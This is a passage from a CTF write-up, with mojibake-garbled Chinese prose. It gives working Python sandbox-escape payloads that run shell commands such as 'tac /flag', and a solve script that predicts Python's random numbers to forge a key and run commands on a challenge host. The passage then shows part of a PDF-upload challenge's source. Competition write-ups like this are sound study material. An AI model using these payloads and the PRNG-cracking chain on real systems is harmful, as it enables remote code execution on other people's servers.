</span></span><span class=line><span class=cl>        <span class=s1>&#39;message&#39;</span><span class=p>:</span> <span class=s1>&#39;Access granted&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>index</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s1>&#39;user_id&#39;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>session</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=s1>&#39;/login&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;index.html&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>host</span><span class=o>=</span><span class=s1>&#39;0.0.0.0&#39;</span><span class=p>,</span> <span class=n>port</span><span class=o>=</span><span class=mi>5001</span><span class=p>,</span> <span class=n>debug</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>è¿‡äº†key2å°±å¯ä»¥ç›´æ¥RCEäº†ï¼Œä¸å‡ºç½‘ï¼Œå…ˆåˆ›å»ºé™æ€æ–‡ä»¶å¤¹</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-JSON data-lang=JSON><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;key&#34;</span><span class=p>:</span> <span class=s2>&#34;3345821131&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;payload&#34;</span><span class=p>:</span> <span class=s2>&#34;(lambda o: o.mkdir(&#39;static&#39;))(next(c.__init__.__globals__[&#39;os&#39;] for c in ().__class__.__base__.__subclasses__() if hasattr(c.__init__,&#39;__globals__&#39;) and &#39;os&#39; in c.__init__.__globals__))&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>å†å†™å…¥æ–‡ä»¶</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-JSON data-lang=JSON><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;key&#34;</span><span class=p>:</span> <span class=s2>&#34;3345821131&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;payload&#34;</span><span class=p>:</span> <span class=s2>&#34;(lambda o: open(&#39;static/out.txt&#39;,&#39;w&#39;).write(o.popen(&#39;whoami&#39;).read()))(next(c.__init__.__globals__[&#39;os&#39;] for c in ().__class__.__base__.__subclasses__() if hasattr(c.__init__,&#39;__globals__&#39;) and &#39;os&#39; in c.__init__.__globals__))&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>ç”±äºéœ€è¦é¢„æµ‹éšæœºæ•°ï¼Œæ‰€ä»¥ç›´æ¥ä¸€æ¬¡æ€§payloadä¼šæ¯”è¾ƒå¥½</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-HTTP data-lang=HTTP><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/api</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>127.0.0.1:5001</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9</span>
</span></span><span class=line><span class=cl><span class=n>sec-ch-ua-mobile</span><span class=o>:</span> <span class=l>?0</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Dest</span><span class=o>:</span> <span class=l>document</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Mode</span><span class=o>:</span> <span class=l>navigate</span>
</span></span><span class=line><span class=cl><span class=n>sec-ch-ua-platform</span><span class=o>:</span> <span class=l>&#34;Windows&#34;</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Site</span><span class=o>:</span> <span class=l>none</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-User</span><span class=o>:</span> <span class=l>?1</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate, br, zstd</span>
</span></span><span class=line><span class=cl><span class=n>sec-ch-ua</span><span class=o>:</span> <span class=l>&#34;Chromium&#34;;v=&#34;140&#34;, &#34;Not=A?Brand&#34;;v=&#34;24&#34;, &#34;Google Chrome&#34;;v=&#34;140&#34;</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/json</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;key&#34;</span><span class=p>:</span> <span class=s2>&#34;3345821131&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;payload&#34;</span><span class=p>:</span> <span class=s2>&#34;(lambda o: [o.mkdir(&#39;static&#39;), open(&#39;static/out.txt&#39;,&#39;w&#39;).write(o.popen(&#39;tac /flag&#39;).read())])(next(c.__init__.__globals__[&#39;os&#39;] for c in ().__class__.__base__.__subclasses__() if hasattr(c.__init__,&#39;__globals__&#39;) and &#39;os&#39; in c.__init__.__globals__))&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>è®©å†™ä¸ªè„šæœ¬</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>randcrack</span> <span class=kn>import</span> <span class=n>RandCrack</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>base_url</span> <span class=o>=</span> <span class=s2>&#34;http://49.232.42.74:30222&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>Session</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>username</span> <span class=o>=</span> <span class=s2>&#34;testuser1&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>password</span> <span class=o>=</span> <span class=s2>&#34;testuser1&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>register_data</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;username&#34;</span><span class=p>:</span> <span class=n>username</span><span class=p>,</span> <span class=s2>&#34;password&#34;</span><span class=p>:</span> <span class=n>password</span><span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>base_url</span><span class=si>}</span><span class=s2>/register&#34;</span><span class=p>,</span> <span class=n>json</span><span class=o>=</span><span class=n>register_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>status_code</span> <span class=o>!=</span> <span class=mi>201</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;æ³¨å†Œå¤±è´¥: </span><span class=si>{</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>    <span class=n>user_id</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>json</span><span class=p>()[</span><span class=s1>&#39;user_id&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;æ³¨å†ŒæˆåŠŸï¼Œuser_id: </span><span class=si>{</span><span class=n>user_id</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>login_data</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;username&#34;</span><span class=p>:</span> <span class=n>username</span><span class=p>,</span> <span class=s2>&#34;password&#34;</span><span class=p>:</span> <span class=n>password</span><span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>base_url</span><span class=si>}</span><span class=s2>/login&#34;</span><span class=p>,</span> <span class=n>json</span><span class=o>=</span><span class=n>login_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>status_code</span> <span class=o>!=</span> <span class=mi>200</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;ç™»å½•å¤±è´¥: </span><span class=si>{</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;ç™»å½•æˆåŠŸ&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>random_numbers</span> <span class=o>=</span> <span class=p>[</span><span class=nb>int</span><span class=p>(</span><span class=n>user_id</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>623</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;key&#34;</span><span class=p>:</span> <span class=s2>&#34;0&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>base_url</span><span class=si>}</span><span class=s2>/api&#34;</span><span class=p>,</span> <span class=n>json</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>status_code</span> <span class=o>!=</span> <span class=mi>403</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;æ”¶é›†éšæœºæ•°å¤±è´¥: </span><span class=si>{</span><span class=n>r</span><span class=o>.</span><span class=n>status_code</span><span class=si>}</span><span class=s2> </span><span class=si>{</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span>
</span></span><span class=line><span class=cl>        <span class=n>key2</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>json</span><span class=p>()[</span><span class=s1>&#39;message&#39;</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>random_numbers</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>key2</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;æ”¶é›†åˆ°ç¬¬</span><span class=si>{</span><span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=si>}</span><span class=s2>ä¸ªéšæœºæ•°: </span><span class=si>{</span><span class=n>key2</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>rc</span> <span class=o>=</span> <span class=n>RandCrack</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>num</span> <span class=ow>in</span> <span class=n>random_numbers</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>rc</span><span class=o>.</span><span class=n>submit</span><span class=p>(</span><span class=n>num</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>next_rand</span> <span class=o>=</span> <span class=n>rc</span><span class=o>.</span><span class=n>predict_getrandbits</span><span class=p>(</span><span class=mi>32</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;é¢„æµ‹çš„ä¸‹ä¸€ä¸ªéšæœºæ•°: </span><span class=si>{</span><span class=n>next_rand</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;next(c.__init__.__globals__[&#39;os&#39;] for c in ().__class__.__base__.__subclasses__() if hasattr(c.__init__,&#39;__globals__&#39;) and &#39;os&#39; in c.__init__.__globals__).popen(&#39;mkdir -p static &amp;&amp; tac /flag &gt; static/out.txt&#39;).read()&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;key&#34;</span><span class=p>:</span> <span class=nb>str</span><span class=p>(</span><span class=n>next_rand</span><span class=p>),</span> <span class=s2>&#34;payload&#34;</span><span class=p>:</span> <span class=n>payload</span><span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>base_url</span><span class=si>}</span><span class=s2>/api&#34;</span><span class=p>,</span> <span class=n>json</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Payloadæ‰§è¡ŒæˆåŠŸ&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Payloadæ‰§è¡Œå¤±è´¥: </span><span class=si>{</span><span class=n>r</span><span class=o>.</span><span class=n>status_code</span><span class=si>}</span><span class=s2> </span><span class=si>{</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>base_url</span><span class=si>}</span><span class=s2>/static/out.txt&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Flag: </span><span class=si>{</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;è¯»å–flagå¤±è´¥: </span><span class=si>{</span><span class=n>r</span><span class=o>.</span><span class=n>status_code</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=pdf2text>pdf2text</h2><p>å…ˆçœ‹çœ‹ä»£ç </p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span> <span class=n>request</span><span class=p>,</span> <span class=n>send_file</span><span class=p>,</span> <span class=n>render_template</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pdfminer.pdfparser</span> <span class=kn>import</span> <span class=n>PDFParser</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pdfminer.pdfdocument</span> <span class=kn>import</span> <span class=n>PDFDocument</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span><span class=o>,</span> <span class=nn>io</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pdfutils</span> <span class=kn>import</span> <span class=n>pdf_to_text</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>config</span><span class=p>[</span><span class=s1>&#39;UPLOAD_FOLDER&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;uploads&#39;</span>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>config</span><span class=p>[</span><span class=s1>&#39;MAX_CONTENT_LENGTH&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=mi>2</span> <span class=o>*</span> <span class=mi>1024</span> <span class=o>*</span> <span class=mi>1024</span>  <span class=c1># 2MB limit</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>os</span><span class=o>.</span><span class=n>makedirs</span><span class=p>(</span><span class=n>app</span><span class=o>.</span><span class=n>config</span><span class=p>[</span><span class=s1>&#39;UPLOAD_FOLDER&#39;</span><span class=p>],</span> <span class=n>exist_ok</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>index</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;index.html&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/upload&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;POST&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>upload_file</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s1>&#39;file&#39;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>request</span><span class=o>.</span><span class=n>files</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s1>&#39;No file part&#39;</span><span class=p>,</span> <span class=mi>400</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>file</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>files</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>filename</span> <span class=o>=</span> <span class=n>file</span><span class=o>.</span><span class=n>filename</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>filename</span> <span class=o>==</span> <span class=s1>&#39;&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s1>&#39;No selected file&#39;</span><span class=p>,</span> <span class=mi>400</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s1>&#39;..&#39;</span> <span class=ow>in</span> <span class=n>filename</span> <span class=ow>or</span> <span class=s1>&#39;/&#39;</span> <span class=ow>in</span> <span class=n>filename</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s1>&#39;directory traversal is not allowed&#39;</span><span class=p>,</span> <span class=mi>403</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>pdf_path</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>app</span><span class=o>.</span><span class=n>config</span><span class=p>[</span><span class=s1>&#39;UPLOAD_FOLDER&#39;</span><span class=p>],</span> <span class=n>filename</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>pdf_content</span> <span class=o>=</span> <span class=n>file</span><span class=o>.</span><span class=n>stream</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># just if is a pdf</span>
</span></span><span class=line><span class=cl>        <span class=n>parser</span> <span class=o>=</span> <span class=n>PDFParser</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>BytesIO</span><span class=p>(</span><span class=n>pdf_content</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>doc</span> <span class=o>=</span> <span class=n>PDFDocument</span><span class=p>(</span><span class=n>parser</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nb>str</span><span class=p>(</span><span class=n>e</span><span class=p>),</span> <span class=mi>500</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>pdf_path</span><span class=p>,</span> <span class=s1>&#39;wb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>pdf_content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>md_filename</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>splitext</span><span class=p>(</span><span class=n>filename</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span> <span class=o>+</span> <span class=s1>&#39;.txt&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>txt_path</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>app</span><span class=o>.</span><span class=n>config</span><span class=p>[</span><span class=s1>&#39;UPLOAD_FOLDER&#39;</span><span class=p>],</span> <span class=n>md_filename</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>pdf_to_text</span><span class=p>(</span><span class=n>pdf_path</span><span class=p>,</span> <span class=n>txt_path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nb>str</span><span class=p>(</span><span class=n>e</span><span class=p>),</span> <span class=mi>500</span> 
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>send_file</span><span class=p>(</span><span class=n>txt_path</span><span class=p>,</span> <span class=n>as_attachment</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
